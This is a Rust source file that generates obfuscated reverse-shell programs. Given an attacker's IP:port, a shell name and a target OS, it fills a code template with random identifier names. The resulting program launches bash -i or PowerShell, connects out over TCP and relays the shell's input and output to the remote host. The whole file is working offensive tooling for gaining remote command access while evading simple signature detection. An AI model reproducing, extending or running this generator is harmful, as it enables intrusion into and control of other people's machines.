use random_string::generate as gen;
use rand::Rng; // 0.8.5

fn randvar() -> String {
    let charset: &str = "abcdefghijklmnopqrstuvwxyz";
    let num: usize = rand::thread_rng().gen_range(2..10);
    return gen(num, charset);
}

struct Skeleton {
    fsfile: String,
    ioread: String,
    iowrite: String,
    nettcpstream: String,
    futexecblkon: String,
    futjoin: String,
    subprocopen: String,
    subprocconf: String,
    subprocredir: String,
    shell: String,
    remoteaddr: String,
    listener: String,
    shellarg: String,
    connproc: String,
    fstdin: String,
    fstdouterr: String,
    stream: String,
    pipeloop: String,
    fdone: String,
    fdtwo: String,
    buf: String,
    nit: String
}

impl Skeleton {
    fn new(fs_file: &str, io_read: &str, io_write: &str, net_tcp_stream: &str, fut_exec_blkon: &str, fut_join: &str, sub_proc_open: &str, sub_proc_conf: &str, sub_proc_redir: &str, shll: &str, remote_addr: &str, lstnr: &str, shllarg: &str, conn_proc: &str, f_stdin: &str, fs_stdout_err: &str, strm: &str, pipe_loop: &str, fd_one: &str, fd_two: &str, buff: &str, ni: &str) -> Skeleton {
        Skeleton {
            fsfile: fs_file.to_string(),
            ioread: io_read.to_string(),
            iowrite: io_write.to_string(),
            nettcpstream: net_tcp_stream.to_string(),
            futexecblkon: fut_exec_blkon.to_string(),
            futjoin: fut_join.to_string(),
            subprocopen: sub_proc_open.to_string(),
            subprocconf: sub_proc_conf.to_string(),
            subprocredir: sub_proc_redir.to_string(),
            shell: shll.to_string(),
            remoteaddr: remote_addr.to_string(),
            listener: lstnr.to_string(),
            shellarg: shllarg.to_string(),
            connproc: conn_proc.to_string(),
            fstdin: f_stdin.to_string(),
            fstdouterr: fs_stdout_err.to_string(),
            stream: strm.to_string(),
            pipeloop: pipe_loop.to_string(),
            fdone: fd_one.to_string(),
            fdtwo: fd_two.to_string(),
            buf: buff.to_string(),
            nit: ni.to_string()
        }
    }
    fn all_payload_skeleton(&self) -> String {
        format!("use async_std::prelude::*;use async_std::{{fs::File as {},io::{{Read as {},Write as {}}},net::TcpStream as {}}};use futures::{{executor::block_on as {},future::join as {}}};use subprocess::{{Popen as {},PopenConfig as {},Redirection as {}}};fn main(){{#[cfg(target_os = \"windows\")]let {}: [&str; 1] = [\"powershell\"];#[cfg(not(target_os = \"windows\"))]let {}: [&str; 2] = [\"{}\", \"-i\"];let {}: &str = \"{}\";let mut {} = {}::create(&{},{} {{stdin: {}::Pipe,stdout: {}::Pipe,stderr: {}::Merge,..Default::default()}}).expect(\"Failed to start shell.\");let {}: {} = {}.stdin.take().unwrap().into();let {}: {} = {}.stdout.take().unwrap().into();{}(async {{let {} = {}::connect({}).await.expect(\"Failed to connect to remote host.\");{}({}(&{}, {}), {}({}, &{})).await}});}}async fn {}<T: {} + Unpin, Y: {} + Unpin>(mut {}: T, mut {}: Y) {{let mut {} = [0; 1024];while let Ok({}) = {}.read(&mut {}).await {{if {} == 0 {{break;}};if let Err(_) = {}.write(&{}[0..{}]).await {{break;}};if let Err(_) = {}.flush().await {{break;}}}}}}", self.fsfile, self.ioread, self.iowrite, self.nettcpstream,self.futexecblkon, self.futjoin,self.subprocopen,self.subprocconf,self.subprocredir,self.shell,self.shell,self.shellarg,self.remoteaddr,self.listener,self.connproc,self.subprocopen,self.shell,self.subprocconf,self.subprocredir,self.subprocredir,self.subprocredir,self.fstdin, self.fsfile, self.connproc,self.fstdouterr, self.fsfile, self.connproc,self.futexecblkon,self.stream, self.nettcpstream, self.remoteaddr,self.futjoin, self.pipeloop, self.stream, self.fstdin, self.pipeloop, self.fstdouterr, self.stream,self.pipeloop, self.ioread, self.iowrite, self.fdone, self.fdtwo,self.buf,self.nit, self.fdone, self.buf,self.nit,self.fdtwo, self.buf, self.nit,self.fdtwo)
    }
    fn win_payload_skeleton(&self) -> String {
        format!("use async_std::prelude::*;use async_std::{{fs::File as {},io::{{Read as {},Write as {}}},net::TcpStream as {}}};use futures::{{executor::block_on as {},future::join as {}}};use subprocess::{{Popen as {},PopenConfig as {},Redirection as {}}};fn main(){{#[cfg(target_os = \"windows\")]let {}: [&str; 1] = [\"{}\"];#[cfg(not(target_os = \"windows\"))]let {}: [&str; 2] = [\"bash\", \"-i\"];let {}: &str = \"{}\";let mut {} = {}::create(&{},{} {{stdin: {}::Pipe,stdout: {}::Pipe,stderr: {}::Merge,..Default::default()}}).expect(\"Failed to start shell.\");let {}: {} = {}.stdin.take().unwrap().into();let {}: {} = {}.stdout.take().unwrap().into();{}(async {{let {} = {}::connect({}).await.expect(\"Failed to connect to remote host.\");{}({}(&{}, {}), {}({}, &{})).await}});}}async fn {}<T: {} + Unpin, Y: {} + Unpin>(mut {}: T, mut {}: Y) {{let mut {} = [0; 1024];while let Ok({}) = {}.read(&mut {}).await {{if {} == 0 {{break;}};if let Err(_) = {}.write(&{}[0..{}]).await {{break;}};if let Err(_) = {}.flush().await {{break;}}}}}}", self.fsfile, self.ioread, self.iowrite, self.nettcpstream,self.futexecblkon, self.futjoin,self.subprocopen,self.subprocconf,self.subprocredir,self.shell,self.shellarg,self.shell,self.remoteaddr,self.listener,self.connproc,self.subprocopen,self.shell,self.subprocconf,self.subprocredir,self.subprocredir,self.subprocredir,self.fstdin, self.fsfile, self.connproc,self.fstdouterr, self.fsfile, self.connproc,self.futexecblkon,self.stream, self.nettcpstream, self.remoteaddr,self.futjoin, self.pipeloop, self.stream, self.fstdin, self.pipeloop, self.fstdouterr, self.stream,self.pipeloop, self.ioread, self.iowrite, self.fdone, self.fdtwo,self.buf,self.nit, self.fdone, self.buf,self.nit,self.fdtwo, self.buf, self.nit,self.fdtwo)
    }
}

pub fn payload_generate(ipportstr: &str, shellstr: &str, osopt: &str) -> String {
    let payloadskelly = Skeleton::new(&randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &ipportstr, &shellstr, &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar(), &randvar());
    if &osopt == &"windows" {
        return payloadskelly.win_payload_skeleton();
    }
    return payloadskelly.all_payload_skeleton();
}